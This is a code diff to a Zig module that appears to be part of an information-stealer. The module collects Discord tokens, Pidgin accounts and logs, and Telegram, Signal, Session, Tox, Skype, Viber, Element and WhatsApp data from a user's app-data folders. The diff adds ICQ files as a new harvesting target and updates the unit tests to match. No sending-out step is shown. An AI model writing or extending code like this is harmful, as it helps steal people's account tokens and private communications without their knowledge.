@@ -10,6 +10,7 @@ const skype = @import("skype.zig");
 const viber = @import("viber.zig");
 const element = @import("element.zig");
 const whatsapp = @import("whatsapp.zig");
+const icq = @import("icq.zig");
 
 pub const MessengerData = struct {
     discord_tokens: [][]const u8,
@@ -24,6 +25,7 @@ pub const MessengerData = struct {
     viber_files: [][]const u8,
     element_files: [][]const u8,
     whatsapp_files: [][]const u8,
+    icq_files: [][]const u8,
 };
 
 fn freeStrings(list: [][]const u8, allocator: std.mem.Allocator) void {
@@ -59,6 +61,7 @@ pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8, local
     const viber_files = viber.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
     const element_files = element.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
     const whatsapp_files = whatsapp.collect(allocator, local_app_data) catch try allocator.alloc([]const u8, 0);
+    const icq_files = icq.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
 
     return MessengerData{
         .discord_tokens = discord_tokens,
@@ -73,6 +76,7 @@ pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8, local
         .viber_files = viber_files,
         .element_files = element_files,
         .whatsapp_files = whatsapp_files,
+        .icq_files = icq_files,
     };
 }
 
@@ -91,6 +95,7 @@ test "collect returns empty result for nonexistent paths" {
         freeStrings(result.viber_files, std.testing.allocator);
         freeStrings(result.element_files, std.testing.allocator);
         freeStrings(result.whatsapp_files, std.testing.allocator);
+        freeStrings(result.icq_files, std.testing.allocator);
     }
     try std.testing.expectEqual(@as(usize, 0), result.discord_tokens.len);
     try std.testing.expectEqual(@as(usize, 0), result.telegram_files.len);
@@ -98,6 +103,7 @@ test "collect returns empty result for nonexistent paths" {
     try std.testing.expectEqual(@as(usize, 0), result.pidgin_accounts.len);
     try std.testing.expectEqual(@as(usize, 0), result.session_files.len);
     try std.testing.expectEqual(@as(usize, 0), result.tox_files.len);
+    try std.testing.expectEqual(@as(usize, 0), result.icq_files.len);
 }
 
 test "MessengerData default is empty" {
@@ -106,6 +112,7 @@ test "MessengerData default is empty" {
         .signal_files = &.{}, .pidgin_accounts = &.{}, .pidgin_logs = &.{},
         .session_files = &.{}, .tox_files = &.{}, .skype_files = &.{},
         .viber_files = &.{}, .element_files = &.{}, .whatsapp_files = &.{},
+        .icq_files = &.{},
     };
     try std.testing.expectEqual(@as(usize, 0), md.discord_tokens.len);
     try std.testing.expectEqual(@as(usize, 0), md.session_files.len);
